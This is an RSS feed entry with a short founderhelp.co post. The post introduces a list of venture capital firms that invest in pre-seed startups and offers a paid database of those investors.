            <p>If you’re a founder, you know that fundraising isn’t easy for pre-product or pre-revenue startups. Most venture funds don’t want to invest in companies that have no product or no traction. After all, startups at this stage have done very little to de-risk their businesses.</p><p>But, some VC’s look to invest in startups at this stage. These pre-seed investors want to write the first check to companies and founders they believe in. Often, they invest alongside angel investors and other pre-seed venture capital firms via convertible notes or SAFEs. Sometimes, they invest in companies on their own.</p><p>Several VC funds only back pre-seed startups. Others invest in a mix of pre-seed, seed, and Series A companies. <strong>To make it easier for you to raise a pre-seed round for your startup, we've compiled a list of investors who participate at this stage and you can view it below. </strong>If you'd like to download the full database of investors and their notable portfolio companies, you can purchase it below.</p><p>We'll continue to update this database as we find more VC’s who make pre-seed investments. If your fund invests in pre-seed companies and doesn’t appear on this list, please email us at <a href="mailto:hello@founderhelp.co">hello@founderhelp.co</a> and we'll be happy to add it.</p><!--kg-card-begin: html--><!--kg-card-end: html--><!--kg-card-begin: html-->
<!--kg-card-end: html-->
    </div>
        
</article>                            </main>
</div>
        </div></div>]]>
            </description>
            <link>https://www.founderhelp.co/pre-seed-vc-firms/</link>
            <guid isPermaLink="false">hacker-news-small-sites-25182280</guid>
            <pubDate>Mon, 23 Nov 2020 00:05:55 GMT</pubDate>
        </item>
    </channel>
</rss>
